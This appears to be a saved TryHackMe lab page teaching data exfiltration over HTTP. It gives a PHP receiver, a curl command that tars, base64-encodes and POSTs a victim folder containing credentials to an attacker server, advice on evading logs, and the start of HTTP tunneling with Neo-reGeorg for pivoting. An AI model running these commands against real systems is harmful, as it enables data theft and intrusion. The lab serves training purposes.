                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Replicate the steps to transfer data over the SSH client. Once you transfer the file successfully, hit <b>Completed </b>and move on to the next task!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Exfiltrate using HTTP(S)
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Before going further, ensure that you have the fundamental knowledge of network protocols before diving into this task and the upcoming tasks.</p><p>This task explains how to use the HTTP/HTTPS protocol to exfiltrate data from a victim to an attacker's machine. As a requirement for this technique, an attacker needs control over a webserver with a server-side programming language installed and enabled. We will show a PHP-based scenario in this task, but it can be implemented in any other programming language, such as python, Golang, NodeJS, etc.<br></p><p><span style="font-size:24px"><span><a class="fdfsgn3q glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;fdfsgn3q&#39;)">HTTP</a> POST Request</span></span></p><p><span>Exfiltration data through the <a class="4mUy8xzf glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;4mUy8xzf&#39;)">HTTP</a> protocol is one of the best options because it is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic. We will use the POST HTTP method in the data exfiltration, and the reason is with the GET request, all parameters are registered into the log file. While using POST request, it doesn't. The following are some of the POST method benefits:</span></p><ul><li style="box-sizing:inherit">POST requests are never cached</li><li style="box-sizing:inherit">POST requests do not remain in the browser history</li><li style="box-sizing:inherit">POST requests cannot be bookmarked</li><li style="box-sizing:inherit">POST requests have no restrictions on <b>data length</b></li></ul><p style="box-sizing:inherit">Let's login to the<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">web.thm.com</span><span style="font-size:1rem">&nbsp;</span>machine using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>credentials and inspect the <a class="Wd0f8umY glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;Wd0f8umY&#39;)">Apache</a> log file with two HTTP requests, one for the GET and the other for the POST, and check what they look like!</span></span></p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Inspecting the <a class="HK153qF6 glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;HK153qF6&#39;)">Apache</a> log file</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box:~$ ssh thm@web.thm.com
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm:
10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0"
10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"</code></pre></div></div><p></p>
<p>Obviously, the first line is a GET request with a file&nbsp;parameter with exfiltrated data. If you try to decode it using the based64 encoding, you would get the transmitted data, which in this case is&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span>.&nbsp;While the second request is a POST to&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">example.php</span>, we sent the same base64 data, but it doesn't show what data was transmitted.</p><p>The base64 data in your access.log looks different, doesn't it? Decode it to find the Flag for Question 1 below.<br></p><p><span style="font-size:1rem">In a typical real-world scenario, an attacker controls a web server in the cloud somewhere on the Internet. An agent or command is executed from a compromised machine to send the data outside the compromised machine's network over the Internet into the webserver. Then an attacker can log in to a web server to get the data, as shown in the following figure.</span><br></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/789a9a13d9977b11d11f53bb7dbb9f3a.png" alt="Typical HTTP Data Exifltration" style="width:1041px;height:463.162px"><span style="font-size:1rem"><br></span></p><p><span style="font-size:24px"><span><a class="b8PV4mv6 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;b8PV4mv6&#39;)">HTTP</a> Data Exfiltration</span></span></p><p><span style="font-size:1rem"><span>Based on the attacker configuration, we can set up either <a class="mBZw06IW glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;mBZw06IW&#39;)">HTTP</a> or HTTPS, the encrypted version of HTTP. We also need a PHP page that handles the POST HTTP request sent to the server.</span></span></p><p><span style="font-size:1rem"></span></p><p><span>We will be using the <a class="wCnr4gyP glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;wCnr4gyP&#39;)">HTTP</a> protocol (not the HTTPS) in our scenario. Now let's assume that an attacker controls the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">web.thm.com</span><span style="font-size:1rem">&nbsp;</span>server, and sensitive data must be sent from the JumpBox or&nbsp;&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim1.thm.com</span><span style="font-size:1rem">&nbsp;</span>machine in our Network 2 environment (192.168.0.0/24).&nbsp;&nbsp;</p><p><span>To exfiltrate data over the <a class="Fh1zNsQ9 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Fh1zNsQ9&#39;)">HTTP</a> protocol, we can apply the following steps:</span></p><ol><li>An attacker sets up a web server with a data handler. In our case, it will be&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">web.thm.com</span><span style="font-size:1rem">&nbsp;</span>and the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">contact.php</span>&nbsp;page as a data handler.</li><li><span>A <a class="t1CPmiCQ glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;t1CPmiCQ&#39;)">C2</a> agent or an attacker sends the data. In our case, we will send data using the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">curl</span>&nbsp;command.</li><li>The webserver receives the data and stores it. In our case, the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">contact.php</span>&nbsp;receives the POST request and stores it into <span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/tmp</span>.</li><li>The attacker logs into the webserver to have a copy of the received data.</li></ol><p><span>Let's follow and apply what we discussed in the previous steps. Remember, since we are using the <a class="Bbib2x80 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Bbib2x80&#39;)">HTTP</a> protocol, the data will be sent in cleartext. However, we will be using other techniques (tar and base64) to change the data's string format so that it wouldn't be in a human-readable format!</span></p><p><span>First, we prepared a webserver with a data handler for this task. The following code snapshot is of <a class="zSXCErlz glossary-term" onclick="initPopOver(&#39;PHP&#39;, &#39;zSXCErlz&#39;)">PHP</a> code to handle POST requests via a&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">file</span><span style="font-size:1rem">&nbsp;</span>parameter and stores the received data in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/tmp</span><span style="font-size:1rem">&nbsp;directory as&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http.bs64</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">file name.</span></p><pre style="font-size:14px" class=" language-php" tabindex="0"><code class=" language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/http.bs64"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span></code></pre><p>Now from the <b>Jump </b>machine, connect to the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim1.thm.com</span><span style="font-size:1rem">&nbsp;</span><span>machine via SSH to exfiltrate the required data over the <a class="crFcmWtc glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;crFcmWtc&#39;)">HTTP</a> protocol. Use the following SSH credentials: </span><span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">thm:tryhackme</span>.</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connecting to Victim1 machine from Jump Box<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box:~$ ssh thm@victim1.thm.com</code>
</pre></div></div><p><span style="font-size:1rem">You can also connect to it from AttackBox using port&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">2022</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">as follow,</span></p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connecting to Victim1 machine from AttackBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@attacker$ ssh thm@MACHINE_IP -p 2022</code></pre></div></div><p></p><p>The goal is to transfer the folder's content, stored in&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/home/thm/task6</span><span style="font-size:1rem">,&nbsp;</span><span style="font-size:1rem"><span>to another machine over the <a class="6ozasHtf glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;6ozasHtf&#39;)">HTTP</a> protocol.</span></span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Checking the Secret folder!<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim1:~$ ls -l
total 12
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task4
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task5
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task6
drwxr-xr-x 1 root root 4096 Jun 19 19:43 task9</code></pre></div></div><p>Now that we have our data, we will be using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">curl</span><span style="font-size:1rem">&nbsp;</span><span>command to send an <a class="g6VvxghL glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;g6VvxghL&#39;)">HTTP</a> POST request with the content of the secret folder as follows,</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Sending POST data via CURL<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php</code></pre></div></div><p>We used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">curl</span>&nbsp;command with&nbsp;<span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">--data</span>&nbsp;argument to send a POST request via the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">file</span><span style="font-size:1rem">&nbsp;</span>parameter. Note that we created an archived file of the secret folder using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tar</span><span style="font-size:1rem">&nbsp;</span>command. We also converted the output of the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tar</span><span style="font-size:1rem">&nbsp;</span>command into base64 representation.</p><p>Next, from the <b>victim1 or JumpBox&nbsp;</b>machine, let's log in to the webserver,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">web.thm.com</span>,<span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">and check the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/tmp</span><span style="font-size:1rem">&nbsp;directory if we have successfully transferred the required data. Use the following SSH credentials in order to login into the web:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">.</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Checking the received data<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim1:~$ ssh thm@web.thm.com 
thm@web:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
thm@web:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD&lt;
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
5gZKZxgrACgAAA==</code></pre></div></div><p>Nice! We have received the data, but if you look closely at the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">http.bs64</span><span style="font-size:1rem">&nbsp;</span><span>file, you can see it is broken base64. This happens due to the URL encoding over the <a class="urW4iCcu glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;urW4iCcu&#39;)">HTTP</a>. The&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">+</span>&nbsp;symbol has been replaced with empty spaces, so let's fix it using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">sed</span><span style="font-size:1rem">&nbsp;command as follows,</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Fixing the http.bs64 file!<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64</code></pre></div></div><p>Using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">sed</span><span style="font-size:1rem">&nbsp;command, we replaced the spaces with&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">+</span><span style="font-size:1rem">&nbsp;characters to make it a valid base64 string!</span></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Restoring the Data</div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt</code></pre></div></div><p>Finally, we decoded the base64 string using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">base64</span>&nbsp;command with&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-d</span><span style="font-size:1rem">&nbsp;argument, then we passed the decoded file and </span>unarchived <span style="font-size:1rem">it using the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tar</span><span style="font-size:1rem">&nbsp;command.</span></p><p><span style="font-size:24px">HTTPS Communications</span></p><p><span>In the previous section, we showed how to perform Data Exfiltration over the <a class="WQz3Zzm2 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;WQz3Zzm2&#39;)">HTTP</a> protocol which means all transmitted data is in cleartext. One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server.</span></p><p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">If you apply the same technique we showed previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted. We have set up our private HTTPS server to show what the transmitted data looks like. If you are interested in setting up your own HTTPS server, we suggest visiting the&nbsp;</span><a target="_blank" href="https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04" class="editor-rtfLink">Digital Ocean website</a><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">.</span><br></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/fbf6c90063102ca100ba8d544ba9d7f8.png" alt="HTTPS traffic in Wireshark"><br></p><p>As shown in the screenshot, we captured the network traffic and it seems that all client and server communications on port&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">443</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">are encrypted.</span></p><p><span style="font-size:24px"><span><a class="OrhQVrct glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;OrhQVrct&#39;)">HTTP</a> Tunneling</span></span></p><p><span>Tunneling over the <a class="hLs8m88P glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;hLs8m88P&#39;)">HTTP</a> protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel!</span></p><p><span style="font-size:1rem"><span>Before diving into <a class="PVLYTuu5 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;PVLYTuu5&#39;)">HTTP</a> tunneling details, let's discuss a typical scenario where many internal computers are not reachable from the Internet. For example, in our scenario, the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">uploader.thm.com</span><span style="font-size:1rem">&nbsp;server is reachable from the Internet and provides web services to everyone. However, the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">app.thm.com</span><span style="font-size:1rem">&nbsp;server runs locally and provides services only for the internal network as shown in the following figure:&nbsp;</span><br></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/92004a7c6a572f9680f0056b9aa88baa.png" alt="HTTP Tunneling" style="width:854px;height:261.914px"></p><p style="text-align:left"><span style="font-size:1rem"><span>In this section, we will create an <a class="lCeiEASF glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;lCeiEASF&#39;)">HTTP</a> tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol. Let's say that we found a web application that lets us upload an HTTP tunnel agent file to a victim webserver</span></span><span style="font-size:1rem">,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">uploader.thm.com</span><span style="font-size:1rem">.</span><span style="font-size:1rem">&nbsp;Once we upload and connect to it,&nbsp;we will be able to communicate with&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">app.thm.com</span><span style="font-size:1rem">.&nbsp;</span></p><p><span>For <a class="5VYR6kRF glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;5VYR6kRF&#39;)">HTTP</a> Tunneling, we will be using a </span><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank">Neo-reGeorg</a> tool to establish a communication channel to access the internal network devices. We have installed the tool in AttackBox, and it can be found in the following location:</p><p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Neo-reGeorg Path on AttackBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox:/opt/Neo-reGeorg#</code></pre></div></div><p></p><p>Next, we need to generate an encrypted client file to upload it to the victim web server as follows,</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Generating encrypted Tunneling Clients with a selected password!<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&amp;  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$&lt;
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
